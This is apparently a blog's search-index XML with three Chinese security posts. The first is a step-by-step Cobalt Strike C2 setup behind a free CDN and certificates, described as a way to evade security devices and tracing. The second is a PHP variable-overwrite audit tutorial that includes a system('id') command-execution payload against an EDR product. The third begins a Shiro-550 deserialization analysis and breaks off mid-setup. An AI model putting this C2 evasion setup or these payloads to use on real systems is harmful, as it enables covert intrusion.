<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CS通过(CDN+证书)powershell上线详细版</title>
      <link href="/2020/10/13/CS%E9%80%9A%E8%BF%87(CDN+%E8%AF%81%E4%B9%A6)powershell%E4%B8%8A%E7%BA%BF%E8%AF%A6%E7%BB%86%E7%89%88/"/>
      <url>/2020/10/13/CS%E9%80%9A%E8%BF%87(CDN+%E8%AF%81%E4%B9%A6)powershell%E4%B8%8A%E7%BA%BF%E8%AF%A6%E7%BB%86%E7%89%88/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>这个应该叫做域前置技术：</p><p>大致图示：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3179004d6115f5f9361413a40108eed2.png" alt="image-20201012101837071"></p><ul><li>攻击流量通过CDN节点将流量转发到真实的C2服务器</li><li>CDN节点ip通过识别请求的Host头进行流量转</li><li>可以有效的躲避一些安全设备，也有这一定的反溯源功能，因为流量都去了CDN上</li></ul><p>之前看了一些文章，但是大佬有些地方觉得简单肯能就没写，自己搭建的时候就写了一些，算是我的一个笔记吧，感觉较为详细了，比较适合新手。</p><h1 id="0x01-需要资源"><a href="#0x01-需要资源" class="headerlink" title="0x01 需要资源"></a>0x01 需要资源</h1><ol><li>cobaltstrike 4.0</li><li>VPS（cs服务器）</li><li>域名</li><li>CDN</li><li>国外代理</li></ol><h1 id="0x02-域名免费申请"><a href="#0x02-域名免费申请" class="headerlink" title="0x02 域名免费申请"></a>0x02 域名免费申请</h1><p>申请地址：<a href="https://www.freenom.com/" target="_blank" rel="noopener">https://www.freenom.com/</a></p><p>重点是免费且不用备案的</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e4c69bb849d45b1db6a6baeec0824326.png" alt="image-20201010175149280"></p><p>自行选择申请免费的域名</p><p><img src="https://img-blog.csdnimg.cn/img_convert/02adb485b70c5594b60991b9c22a74df.png" alt="image-20201010175235902"></p><h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>要挂代理，然后把个人信息的地址设置成代理的地址，要不可能申请不成功</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6487e6be2598ba5dbfa43b078dba33d2.png" alt="image-20201010182351230"></p><h1 id="0x03-免费CDN准备"><a href="#0x03-免费CDN准备" class="headerlink" title="0x03 免费CDN准备"></a>0x03 免费CDN准备</h1><p>申请地址：<a href="https://dash.cloudflare.com/" target="_blank" rel="noopener">https://dash.cloudflare.com/</a></p><p>自行注册并登录设置CDN</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f96d9bbff4afb77abd90f6fefd49e8b8.png" alt="image-20201010175449713"></p><h1 id="0x04-域名和CDN联动设置"><a href="#0x04-域名和CDN联动设置" class="headerlink" title="0x04 域名和CDN联动设置"></a>0x04 域名和CDN联动设置</h1><p><strong>登陆CDN,添加站点为刚刚申请的域名</strong></p><p><img src="https://img-blog.csdnimg.cn/img_convert/73b58d60b272b54b89170afff2a9282b.png" alt="image-20201010202027672"></p><p><strong>添加A记录，指向VPS的IP地址</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">类型名称 内容           TTL代理状态</span><br><span class="line">A    test 10.1.1.111（VPS地址）   自动   已代理</span><br><span class="line"></span><br><span class="line">那么这个地址就是 test.xxxxx.tk</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/9d21ee853ccd1bf45667d011352d61ce.png" alt="image-20201010202316056"></p><p><strong>记住Cloudflare 名称服务器，这个是要设置到域名那边的！</strong></p><p><img src="https://img-blog.csdnimg.cn/img_convert/082ea05252aaaf35e1f0ad4e7d0b89f4.png" alt="image-20201010202359523"></p><p><strong>找到自己的域名——管理域名——nameservers</strong></p><p><img src="https://img-blog.csdnimg.cn/img_convert/7a2b9e4a1f4ea08227c1952f1ca62373.png" alt="image-20201010182519563"></p><p>选择使用自己的域名解析：<strong>Use custom nameservers (enter below)</strong></p><p><strong>Nameserver 1、2 都写CDN提供的地址</strong></p><p><img src="https://img-blog.csdnimg.cn/img_convert/6f604af630ac0f2806ccb1d2b917a796.png" alt="image-20201010201508750"></p><p>为了实时受到我们的命令的响应:我们需要修改缓存规则：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/fca6387be039454564e0d4d3f46f6e5e.png" alt="image-20201010202805943"></p><p>保证这两项是开着的</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7bffe68b08a2b32b4cdd2268589776b2.png" alt="image-20201010202943159"></p><h1 id="0x05-C2证书配置"><a href="#0x05-C2证书配置" class="headerlink" title="0x05 C2证书配置"></a>0x05 C2证书配置</h1><h3 id="首先选择证书模式：完全"><a href="#首先选择证书模式：完全" class="headerlink" title="首先选择证书模式：完全"></a>首先选择证书模式：完全</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/8276505b66a3b83eb460eac6d32136f9.png" alt="image-20201010203244193"></p><h3 id="下载证书"><a href="#下载证书" class="headerlink" title="下载证书"></a>下载证书</h3><p>生成成功保存下来,我保存的是 com.pem,com.key</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d6068d2ca316bc096d1160f130e0069c.png" alt="image-20201010203449655"></p><h3 id="在VPS上生成CS可用的配置文件"><a href="#在VPS上生成CS可用的配置文件" class="headerlink" title="在VPS上生成CS可用的配置文件"></a>在VPS上生成CS可用的配置文件</h3><p>使用以下命令重新生成cobalstrike.store：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in server.pem -inkey server.key -out spoofdomain.p12 -name 域名 -passout pass:密码</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">openssl pkcs12 -export -in com.pem -inkey com.key -out spoofdomain.p12 -name test.xxxxx.tk -passout pass:zzz123456</span><br></pre></td></tr></table></figure><p>使用以下命令创建证书：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -deststorepass 密码 -destkeypass 密码 -destkeystore new.store -srckeystore spoofdomain.p12 -srcstoretype PKCS12 -srcstorepass 密码 -alias 域名</span><br><span class="line"></span><br><span class="line">例子</span><br><span class="line">keytool -importkeystore -deststorepass zzz123456 -destkeypass zzz123456 -destkeystore new.store -srckeystore spoofdomain.p12 -srcstoretype PKCS12 -srcstorepass zzz123456 -alias test.xxxxx.tk</span><br></pre></td></tr></table></figure><p>最终生成 new.store 文件，（为cobalstrike.store的替代品）</p><p><img src="https://img-blog.csdnimg.cn/img_convert/17d7dde17a83349f0d080c4544256ce5.png" alt="image-20201010175918055"></p><h1 id="0x06-C2-profile配置"><a href="#0x06-C2-profile配置" class="headerlink" title="0x06 C2.profile配置"></a>0x06 C2.profile配置</h1><p>直接使用以下项目:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;FortyNorthSecurity&#x2F;C2concealer</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">安装命令：</span><br><span class="line">chmod u+x install.sh</span><br><span class="line">.&#x2F;install.sh</span><br><span class="line">使用命令:</span><br><span class="line">C2concealer --variant 1 --hostname test.domain.tk</span><br></pre></td></tr></table></figure><p>这里选择3</p><p>因为我们使用的CDN给的证书，然后输入/home/cs/new.store,这就是刚刚生成的new.store的绝对路径来。</p><p>最终会生成随机名的profile</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6d0be6eda900a07a3b8f11c0582d25e4.png" alt="image-20201010180452978"></p><p>成功生成</p><p><img src="https://img-blog.csdnimg.cn/img_convert/761e77cc25cd3f729a31214b108bfdd7.png" alt="image-20201010145837473"></p><p>最后讲生成的这个随机数.profile，复制到cs目录下。</p><h1 id="0x07-启动C2"><a href="#0x07-启动C2" class="headerlink" title="0x07 启动C2"></a>0x07 启动C2</h1><h3 id="用c2lint-检查下，下面这样就是通过："><a href="#用c2lint-检查下，下面这样就是通过：" class="headerlink" title="用c2lint 检查下，下面这样就是通过："></a><strong>用c2lint 检查下，下面这样就是通过：</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;c2lint ca730a6d.profile</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/6bab1a7057868d4f4803a5f7f802b4b6.png" alt="image-20201010161604398"></p><h3 id="检查成功后，修改teamserver配置"><a href="#检查成功后，修改teamserver配置" class="headerlink" title="检查成功后，修改teamserver配置"></a>检查成功后，修改teamserver配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim teamserver</span><br></pre></td></tr></table></figure><p>修改最后一行的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.net.ssl.keyStore&#x3D;.&#x2F;new.store （证书生成的new.store文件地址）   -Djavax.net.ssl.keyStorePassword&#x3D;zzz123456（上面证书的那个密码）</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/ad674fc579c3de6e473e1769330527e8.png" alt="image-20201010181400207"></p><h3 id="启动C2"><a href="#启动C2" class="headerlink" title="启动C2"></a>启动C2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;teamserver 192.168.1.1 password123456 .&#x2F;C2.profile</span><br></pre></td></tr></table></figure><h1 id="0x08-配置CS"><a href="#0x08-配置CS" class="headerlink" title="0x08 配置CS"></a>0x08 配置CS</h1><p>配置一个监听器</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20201010215220.png" alt="image-20201010215216698"></p><p>配置一个powershell上线，注意要勾选SSL</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20201010215502.png" alt="image-20201010215502324"></p><h1 id="0x09-成功上线"><a href="#0x09-成功上线" class="headerlink" title="0x09 成功上线"></a>0x09 成功上线</h1><p>成功上线</p><p><img src="https://img-blog.csdnimg.cn/img_convert/91beb34e8909fa27159c292b65af429e.png" alt="image-20201010204019920"></p><h1 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h1><p>本次搭建是以免费的网站为主，但是实际操作起来发现，这个CDN还是有时候不太稳定，有条件的可以换个好的，但是注意要关掉缓存。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计：变量覆盖</title>
      <link href="/2020/09/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
      <url>/2020/09/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h1><p>本文是给作为给小伙伴分享教学的一篇文章，给讲一下，所以写的比较简陋。。。见谅而且都比较基础，只是简单讲课提纲吧</p><h1 id="0x01-变量覆盖审计"><a href="#0x01-变量覆盖审计" class="headerlink" title="0x01 变量覆盖审计"></a><strong>0x01 变量覆盖审计</strong></h1><h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a><strong>0x00 简介</strong></h3><p>变量覆盖，顾名思义就是可以覆盖已有变量值，导致变量覆盖的漏洞</p><h3 id="常见的造成的代码审计的情景是代码中出现以下关键词："><a href="#常见的造成的代码审计的情景是代码中出现以下关键词：" class="headerlink" title="常见的造成的代码审计的情景是代码中出现以下关键词："></a>常见的造成的代码审计的情景是代码中出现以下关键词：</h3><ul><li>register_globals=on</li><li>extract()函数</li><li>parse_str()函数</li><li>import_request_variables()函数</li><li>$$</li></ul><h3 id="0x01-变量覆盖演示"><a href="#0x01-变量覆盖演示" class="headerlink" title="0x01 变量覆盖演示"></a><strong>0x01 变量覆盖演示</strong></h3><h4 id="extract"><a href="#extract" class="headerlink" title="extract()"></a><strong>extract()</strong></h4><p><strong><code>extract(array,extract_rules,prefix)</code>函数</strong></p><p><a href="https://www.runoob.com/php/func-array-extract.html" target="_blank" rel="noopener">https://www.runoob.com/php/func-array-extract.html</a></p><p>该函数可以从数组中将变量导入到当前的符号表，即将数组中的键值对注册成函数，使用数组键名作为变量名，使用数组键值作为变量值。</p><p>这里我们要注意一下该函数的第二个参数</p><ul><li>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</li><li>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。</li></ul><p>这就为我们提供了覆盖的可能。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'a'</span>;</span><br><span class="line"><span class="keyword">echo</span> $a.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">echo</span> $a</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到我们初始变量值为a但是覆盖之后就变成了我们输入的值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;extract.php?a&#x3D;123</span><br></pre></td></tr></table></figure><p><img src="https://img-service.csdnimg.cn/img_convert/4f669db21f0bc23cc971d06175db4981.png" alt="image-20200907141301903"></p><p>修复：</p><p>在使用extract()函数时，可以指定将第二个参数设置为EXTRS_KIP</p><h4 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a><strong>parse_str()</strong></h4><p><strong><code>parse_str()</code>函数</strong>用于把查询字符串解析到变量中，如果没有<strong>array参数</strong>，则由该函数设置的变量将覆盖已存在的同名变量。</p><p>在没有array参数的情况下使用此函数，</p><p>并且在PHP 7.2中将废弃不设置参数的行为,此函数没有返回值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"giao"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"a:"</span> . $a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">parse_str($b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"a_2:"</span> . $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;parse_str.php?b&#x3D;a&#x3D;zeo</span><br></pre></td></tr></table></figure><p><img src="https://img-service.csdnimg.cn/img_convert/aecb348b0fc1f99298b6b59fa627becb.png" alt="image-20200907145448737"></p><h4 id=""><a href="#" class="headerlink" title="$$"></a><strong>$$</strong></h4><p>典型的例子就是<strong>foreach</strong>来遍历数组中的值作为变量。</p><p>$$是一种可变变量的写法，它可以使一个普通变量的值作为可变变量的名字，这种类型常常会使用遍历的方式来释放变量的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">    $$k = $v;</span><br><span class="line">    <span class="keyword">echo</span> $a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-service.csdnimg.cn/img_convert/8c093c65bd382b9c6c5f5dd06977423b.png" alt="image-20200907141129332"></p><h4 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a><strong>import_request_variables()</strong></h4><p><strong><code>import_request_variables ( string $types , string $prefix )</code></strong></p><p><a href="https://www.runoob.com/php/php-import\_request\_variables-function.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-import\_request\_variables-function.html</a></p><p><strong>import_request_variables()</strong> 函数将 GET／POST／Cookie 变量导入到全局作用域中。<strong>该函数在最新版本的 PHP 中已经不支持。</strong></p><p><strong>import_request_variables()</strong> 函数将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。</p><p>版本要求：PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0</p><p><strong>第二个参数$types</strong>：指定需要导入的变量，可以用字母 G、P 和 C 分别表示 GET、POST 和 Cookie，这些字母不区分大小写，所以你可以使用 g 、 p 和 c 的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用 gp 时，POST 变量将使用相同的名字覆盖 GET 变量。任何 GPC 以外的字母都将被忽略。</p><p><img src="https://img-service.csdnimg.cn/img_convert/51a4fd89763e1ae851d2c354e939e346.png" alt="image-20200907104858013"></p><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><p>当你在升级PHP到PHP5.4及之后的版本的时候，是否发现register_global配置指令不再生效了呢</p><p>因为从PHP5.4开始register_global配置指令被移除了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"register_globals: "</span> . (int)ini_get(<span class="string">"register_globals"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"a="</span> . $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-service.csdnimg.cn/img_convert/79f3b1584af3d084212dc748638eadde.png" alt="image-20200907114032777"></p><h1 id="0x02-深x服edr实例"><a href="#0x02-深x服edr实例" class="headerlink" title="0x02 深x服edr实例"></a>0x02 深x服edr实例</h1><p>简化后的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#var_dump($_REQUEST);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$show_form = <span class="function"><span class="keyword">function</span><span class="params">($params)</span> <span class="title">use</span><span class="params">(&amp;$strip_slashes, &amp;$show_input)</span> </span>&#123;</span><br><span class="line">    extract($params);</span><br><span class="line"></span><br><span class="line">    $host  = <span class="keyword">isset</span>($host)  ? $strip_slashes($host)  : <span class="string">"127.0.0.1"</span>;</span><br><span class="line">    $path  = <span class="keyword">isset</span>($path)  ? $strip_slashes($path)  : <span class="string">""</span>;</span><br><span class="line">    $row   = <span class="keyword">isset</span>($row)   ? $strip_slashes($row)   : <span class="string">""</span>;</span><br><span class="line">    $limit = <span class="keyword">isset</span>($limit) ? $strip_slashes($limit) : <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绘制表单</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;form id="studio" name="studio" method="post" action=""&gt;'</span>;</span><br><span class="line">    $show_input(<span class="keyword">array</span>(<span class="string">"title"</span> =&gt; <span class="string">"Host "</span>,  <span class="string">"name"</span> =&gt; <span class="string">"host"</span>,  <span class="string">"value"</span> =&gt; $host,  <span class="string">"note"</span> =&gt; <span class="string">" - host, e.g. 127.0.0.1"</span>));</span><br><span class="line">    $show_input(<span class="keyword">array</span>(<span class="string">"title"</span> =&gt; <span class="string">"Path "</span>,  <span class="string">"name"</span> =&gt; <span class="string">"path"</span>,  <span class="string">"value"</span> =&gt; $path,  <span class="string">"note"</span> =&gt; <span class="string">" - path regex, e.g. mapreduce"</span>));</span><br><span class="line">    $show_input(<span class="keyword">array</span>(<span class="string">"title"</span> =&gt; <span class="string">"Row  "</span>,  <span class="string">"name"</span> =&gt; <span class="string">"row"</span>,   <span class="string">"value"</span> =&gt; $row,   <span class="string">"note"</span> =&gt; <span class="string">" - row regex, e.g. \s[w|e]\s"</span>));</span><br><span class="line">    $show_input(<span class="keyword">array</span>(<span class="string">"title"</span> =&gt; <span class="string">"Limit"</span>,  <span class="string">"name"</span> =&gt; <span class="string">"limit"</span>, <span class="string">"value"</span> =&gt; $limit, <span class="string">"note"</span> =&gt; <span class="string">" - top n, e.g. 100"</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;input type="submit" id="button"&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$show_form($_REQUEST);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>变量匿名函数 <code>$show_form</code> 具有一个形式参数 <code>$params</code></p><p>在这里也就是<strong>array(“strip_slashes”=&gt;“system”,“host”=&gt;“id”);</strong></p><p>接下来执行<strong>extract($params);</strong>，后进入如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$host  = <span class="keyword">isset</span>($host)  ? $strip_slashes($host)  : <span class="string">"127.0.0.1"</span>;</span><br></pre></td></tr></table></figure><p>在这个过程中就产生了漏洞，想要了解具体原因：</p><p>首先函数传入参数值为<code>array(&quot;strip_slashes&quot;=&gt;&quot;system&quot;,&quot;host&quot;=&gt;&quot;id&quot;);</code></p><p>经过<code>extract()</code>函数后，赋值了2个变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$strip_slashes &#x3D; &#39;system&#39;;</span><br><span class="line">$host &#x3D; &#39;id&#39;;</span><br></pre></td></tr></table></figure><p>变量<code>$host</code>利用三元运算重新赋值<code>$strip_slashes($host)</code></p><p>而实际上其赋值内容是函数<code>system(&#39;id&#39;)</code>的返回结果，这也就造成了命令执行漏洞。</p><h1 id="0x03MetInfo实例"><a href="#0x03MetInfo实例" class="headerlink" title="0x03MetInfo实例"></a>0x03MetInfo实例</h1><p>/include/common.inc.php</p><p>传入的cookie、get、post参数进行变量赋值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>, <span class="string">'_POST'</span>, <span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line"><span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $$_key = daddslashes($_value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>daddslashes()</code>防注入，不过并不影响</p><p>随便来到一个子文件看看他的加载方式\about\index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># MetInfo Enterprise Content Management System </span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. </span></span><br><span class="line">$filpy = basename(dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">$fmodule=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../include/module.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span> $module;</span><br><span class="line"><span class="comment"># This program is an open source system, commercial use, please consciously to purchase commercial license.</span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里使用了require_once函数包含了/include/module.php文件，可以发现这个文件又包含了common.inc.php文件</p><p>出现了两个未知变量：<code>$module</code>，<code>$fmodule</code>。我们可以用<code>$fmodule</code>变量通过两次文件包含，使用<code>$_request</code>来获取GET传递的新<code>$fmodule</code>值实现变量覆盖。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Shiro 550 反序列化漏洞 详细分析+poc编写</title>
      <link href="/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/"/>
      <url>/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>shiro反序列化漏洞这个从 shiro 550 开始，在2016年就爆出来, 但是到现在在各种攻防演练中也起到了显著作用</p><p>这个漏洞一直都很好用，特别是一些红蓝对抗HW的下边界突破很好用</p><p>遂研究一下这个漏洞的成因和分析一下代码</p><h1 id="0x01-Shiro-550-漏洞描述"><a href="#0x01-Shiro-550-漏洞描述" class="headerlink" title="0x01 Shiro 550 漏洞描述"></a>0x01 Shiro 550 漏洞描述</h1><p>Apache Shiro RememberMe 反序列化导致的命令执行漏洞</p><p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理</p><p>编号：Shiro-550, CVE-2016-4437</p><p>版本：Apache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)</p><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><p>编辑器：IDEA 2020</p><p>java版本：jdk1.7.0_80</p><p>Server版本 : Tomcat 8.5.56</p><p>shiro版本：shiro-root-1.2.4</p><p>组件：commons-collections4</p><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><p>如果闲配置麻烦，也可以直接用我弄好的GitHub地址</p><p><a href="https://github.com/godzeo/shiro\_1.2.4\_sample.git" target="_blank" rel="noopener">https://github.com/godzeo/shiro\_1.2.4\_sample.git</a></p><h3 id="正常搭建"><a href="#正常搭建" class="headerlink" title="正常搭建"></a>正常搭建</h3><p>直接下载：</p><p><a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4" target="_blank" rel="noopener">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p><p>下载好以后直接解压</p><p>然后偷偷的进入samples/web目录，直接修改pom文件，主要修改下面这些</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 